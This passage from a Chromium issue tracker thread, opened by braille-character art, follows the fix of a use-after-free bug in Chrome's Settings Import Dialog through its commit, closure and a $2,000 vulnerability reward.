⠀⣸⠀⠀⡇⠘⠦⣭⡤⢟⡤⠤⣀⠀⠣⣀⡉⢁⣀⠟⠀⠀⢷⠀⠀⠀⠙⣗⠀⠀
⠁⢻⠀⠀⢷⢀⡔⠉⢻⡅⣀⣤⡈⠙⠒⠺⠯⡍⠁⠀⠀⠀⢸⡆⠀⠀⠀⠘⡶⠄
⠀⣈⣧⠴⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠸⣔
⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⣤⡤⠴⠖⠋⢹⠃⠀⠀⠀⠀⠀⣷
⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣻⠁⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣼
⠙⠑⣤⣀⠀⠀⠀⠀⠀⢀⠀⠀⢄⣐⠴⠋⠀⠀⠀⠀⠀⠀⠘⢆⠀⠀⠀⠀⣰⠟
⠀⠀⠀⣑⡟⠛⠛⠛⠛⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⡾⠋⠀
⠀⠀⠀⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀
⠀⠀⣰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀
⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠃

### to...@chromium.org (2022-08-01)

Thanks for your theory dcheng, I have this CL under review:
https://chromium-review.googlesource.com/c/chromium/src/+/3802769

### gi...@appspot.gserviceaccount.com (2022-08-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/99db8087b2ca9ac6c939f5afbf0060c7c783cf33

commit 99db8087b2ca9ac6c939f5afbf0060c7c783cf33
Author: Tommy C. Li <tommycli@chromium.org>
Date: Tue Aug 02 16:14:01 2022

[settings] Fix UaF bug in Chrome Settings Import Dialog

Bug: 1302813
Change-Id: I38683a87b195341f444a9d5b2bcbd1444dcac29d
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3802769
Reviewed-by: John Lee <johntlee@chromium.org>
Commit-Queue: John Lee <johntlee@chromium.org>
Auto-Submit: Tommy Li <tommycli@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1030585}

[modify] https://crrev.com/99db8087b2ca9ac6c939f5afbf0060c7c783cf33/chrome/browser/ui/webui/settings/import_data_handler.cc


### sa...@gmail.com (2022-09-01)

ping

### sa...@gmail.com (2022-09-16)

ping

### ad...@google.com (2022-09-21)

https://crbug.com/chromium/1302813#c19 appears to be a complete fix, so marking this as Fixed.

tommycli@ please reopen if I'm wrong. Also, please mark bugs as Fixed in future - had you done so, Sheriffbot would have arranged to backmerge this and get the fix to our users quicker.

### ad...@google.com (2022-09-21)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-21)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-22)

[Empty comment from Monorail migration]

### to...@chromium.org (2022-09-22)

Yes, that was a complete fix, Thanks for that tip adetaylor@.

### am...@google.com (2022-09-27)

[Empty comment from Monorail migration]

### am...@google.com (2022-09-30)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-09-30)

Congratulations! The VRP Panel has decided to award you $2,000 for this report of this heavily mitigated security bug (https://g.co/chrome/vrp). Thank you for your efforts and reporting this issue to us! 

### sa...@gmail.com (2022-09-30)

yayyyyyyyyyyyyyyyyy

### am...@google.com (2022-10-03)

[Empty comment from Monorail migration]

### pg...@google.com (2022-11-01)

[Empty comment from Monorail migration]

### [Deleted User] (2022-12-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2022-12-28)

This issue was migrated from crbug.com/chromium/1302813?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/1344519]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058962)*
